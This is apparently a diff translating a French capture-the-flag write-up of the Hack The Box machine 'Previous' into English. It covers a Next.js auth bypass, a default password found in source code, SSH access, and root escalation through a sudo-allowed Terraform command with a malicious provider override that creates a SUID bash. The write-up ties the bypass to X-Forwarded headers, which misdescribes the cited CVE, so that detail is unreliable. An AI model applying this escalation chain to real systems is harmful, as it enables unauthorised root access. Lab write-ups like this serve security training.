@@ -1,114 +1,114 @@
 # CTF – Previous (Writeup)
 
-## Contexte
+## Context
 
-Dans ce challenge Hack The Box, la machine cible est accessible via le domaine `previous.htb`.  
-L’application web repose sur **Next.js** et implémente une authentification via `next-auth`.
+In this Hack The Box challenge, the target machine is reachable through the domain `previous.htb`.  
+The web app is built on **Next.js** and handles authentication with `next-auth`.
 
-L’objectif est d’obtenir un accès initial à l’application, puis d’escalader mes privilèges jusqu’à obtenir un accès **root** sur la machine.
+The goal is to get initial access to the app, then escalate privileges up to **root** on the machine.
 
 ---
 
-## Reconnaissance initiale – Application Next.js
+## Initial recon – Next.js application
 
-En accédant au site web, je remarque que l’application renvoie systématiquement des redirections **HTTP 307** vers l’endpoint suivant :
+Hitting the website, I notice the app always returns **HTTP 307** redirects to the following endpoint:
 
     /api/auth/signin?callbackUrl=...
 
-Ce comportement est caractéristique d’une application **Next.js** utilisant `next-auth`.
+This behavior is typical of a **Next.js** app using `next-auth`.
 
-Après recherche, j’identifie une vulnérabilité connue permettant de **bypasser certaines protections** en manipulant des headers spécifiques :
+After some research, I find a known vulnerability that lets you **bypass some protections** by manipulating specific headers:
 
 - `X-Forwarded-For`
 - `X-Forwarded-Host`
 - `X-Forwarded-Proto`
 
-Cette vulnérabilité est documentée publiquement (CVE-2025-29927).
+This vulnerability is publicly documented (CVE-2025-29927).
 
 ---
 
-## Bypass d’accès aux routes internes
+## Bypassing access to internal routes
 
-En modifiant les headers HTTP lors des requêtes, je parviens à accéder à des routes internes normalement protégées, notamment :
+By tweaking the HTTP headers on the requests, I reach internal routes that are normally protected, notably:
 
     /api/auth
     /api/auth/providers
     /api/auth/session
 
-Cela me permet d’explorer la logique d’authentification côté backend.
+That lets me explore the backend authentication logic.
 
 ---
 
-## Découverte d’un compte applicatif
+## Finding an application account
 
-En auditant le code et les endpoints liés à l’authentification, je découvre un provider **Credentials** défini dans le fichier `lib/auth.ts`.
+Auditing the code and the auth-related endpoints, I find a **Credentials** provider defined in `lib/auth.ts`.
 
-Une condition critique apparaît dans le code :
+A critical condition shows up in the code:
 
     if (
       credentials?.username === "jeremy" &&
       credentials.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes")
     )
 
-Cette logique révèle :
-- l’existence d’un compte applicatif nommé **jeremy**
-- un mot de passe **en clair par défaut** si la variable d’environnement `ADMIN_SECRET` n’est pas définie
+This logic reveals:
+- an application account named **jeremy**
+- a **default cleartext password** if the `ADMIN_SECRET` environment variable isn't set
 
 ---
 
-## Accès initial – Authentification en tant que jeremy
+## Initial access – Authenticating as jeremy
 
-Je teste ces identifiants via le formulaire d’authentification :
+I test these credentials through the login form:
 
-- Utilisateur : jeremy  
-- Mot de passe : MyNameIsJeremyAndILovePancakes  
+- User: jeremy  
+- Password: MyNameIsJeremyAndILovePancakes  
 
-L’authentification est réussie.  
-Je dispose désormais d’identifiants valides pour accéder au système.
+The login succeeds.  
+I now have valid credentials to access the system.
 
 ---
 
-## Accès SSH
+## SSH access
 
-Je tente une connexion SSH avec ces identifiants :
+I try an SSH connection with these credentials:
 
     ssh jeremy@<IP>
 
-La connexion est réussie et j’obtiens un shell en tant que l’utilisateur **jeremy**.
+The connection succeeds and I get a shell as user **jeremy**.
 
 ---
 
-## Énumération locale
+## Local enumeration
 
-Une fois connecté, je commence par une énumération locale classique.
+Once connected, I start with standard local enumeration.
 
-Je vérifie les droits sudo :
+I check the sudo privileges:
 
     sudo -l
 
-Résultat :
+Result:
 
     (root) /usr/bin/terraform -chdir=/opt/examples apply
 
-L’utilisateur `jeremy` est autorisé à exécuter **Terraform en root**, mais uniquement avec cette commande précise.
+The `jeremy` user is allowed to run **Terraform as root**, but only with this exact command.
 
 ---
 
-## Analyse de Terraform – Provider Override
+## Looking at Terraform – Provider Override
 
-Terraform permet de charger des **providers locaux** via un fichier de configuration utilisateur `~/.terraformrc`.
+Terraform can load **local providers** through a user config file `~/.terraformrc`.
 
-Cette fonctionnalité peut être exploitée pour forcer Terraform à charger un **provider malveillant** contrôlé par l’utilisateur.
+This feature can be abused to force Terraform to load a **malicious provider** controlled by the user.
 
 ---
 
-## Création d’un provider Terraform malveillant
+## Creating a malicious Terraform provider
 
-Je crée un faux provider Terraform dans mon répertoire utilisateur :
+I create a fake Terraform provider in my user directory:
 
     mkdir -p ~/.terraform.d/plugins
 
-Je crée ensuite le binaire malveillant :
+Then I create the malicious binary:
 
     cat > ~/.terraform.d/plugins/terraform-provider-examples_v99.0.0 <<'EOF'
     #!/bin/sh
@@ -121,9 +121,9 @@ Je crée ensuite le binaire malveillant :
 
 ---
 
-## Configuration du provider override
+## Configuring the provider override
 
-Je configure Terraform pour utiliser mon provider local via `~/.terraformrc` :
+I configure Terraform to use my local provider through `~/.terraformrc`:
 
     cat > ~/.terraformrc <<'EOF'
     provider_installation {
@@ -136,69 +136,69 @@ Je configure Terraform pour utiliser mon provider local via `~/.terraformrc` :
 
 ---
 
-## Exécution de Terraform en root
+## Running Terraform as root
 
-Je lance **exactement** la commande autorisée par sudo, en forçant Terraform à utiliser ma configuration :
+I run **exactly** the command allowed by sudo, forcing Terraform to use my config:
 
     sudo TF_CLI_CONFIG_FILE=/home/jeremy/.terraformrc \
     /usr/bin/terraform -chdir=/opt/examples apply
 
-Terraform échoue lors du handshake du provider, mais le binaire malveillant est exécuté **avec les privilèges root**.
+Terraform fails during the provider handshake, but the malicious binary runs **with root privileges**.
 
-Résultat :
-- création de `/tmp/bashroot`
-- binaire bash avec le bit **SUID root**
+Result:
+- `/tmp/bashroot` is created
+- a bash binary with the **SUID root** bit
 
 ---
 
-## Escalade finale
+## Final escalation
 
-Je lance le binaire SUID :
+I run the SUID binary:
 
     /tmp/bashroot -p
     id
 
-Je récupère alors un shell **root** sur la machine.
+I get a **root** shell on the machine.
 
 ---
 
-## Chaîne d’attaque récapitulative
+## Attack-chain summary
 
-- Identification d’une application Next.js vulnérable
-- Bypass de protections via headers HTTP (CVE-2025-29927)
-- Accès aux endpoints internes d’authentification
-- Découverte d’un compte applicatif avec mot de passe par défaut
-- Accès SSH en tant que jeremy
-- Découverte d’un droit sudo sur Terraform
-- Abus de provider override Terraform
-- Exécution de code arbitraire en root
-- Obtention d’un shell root
+- Identified a vulnerable Next.js application
+- Bypassed protections through HTTP headers (CVE-2025-29927)
+- Reached internal authentication endpoints
+- Found an application account with a default password
+- SSH access as jeremy
+- Found a sudo right on Terraform
+- Abused a Terraform provider override
+- Arbitrary code execution as root
+- Got a root shell
 
 ---
 
 ## Conclusion
 
-Ce challenge met en évidence :
-- les risques liés aux frameworks web mal configurés
-- la dangerosité des secrets par défaut en production
-- l’impact critique des outils d’infrastructure exécutés avec sudo
-- les dangers des mécanismes d’extension non restreints (Terraform providers)
+This challenge shows:
+- the risk of misconfigured web frameworks
+- how dangerous default secrets are in production
+- the critical impact of infrastructure tools run with sudo
+- the dangers of unrestricted extension mechanisms (Terraform providers)
 
-L’exploitation combine :
-- attaque applicative
-- analyse de code
-- post-exploitation Linux
-- escalade de privilèges avancée via outil DevOps
+The exploitation combines:
+- application attack
+- code analysis
+- Linux post-exploitation
+- advanced privilege escalation through a DevOps tool
 
 ---
 
-## Compétences démontrées
+## Skills demonstrated
 
-- Analyse d’applications Next.js
-- Exploitation de vulnérabilités logiques
-- Manipulation de headers HTTP
-- Audit de code d’authentification
-- Accès SSH et énumération locale
-- Analyse de droits sudo
-- Exploitation de Terraform
-- Escalade de privilèges Linux jusqu’au root
+- Next.js application analysis
+- Logic vulnerability exploitation
+- HTTP header manipulation
+- Authentication code audit
+- SSH access and local enumeration
+- sudo rights analysis
+- Terraform exploitation
+- Linux privilege escalation up to root
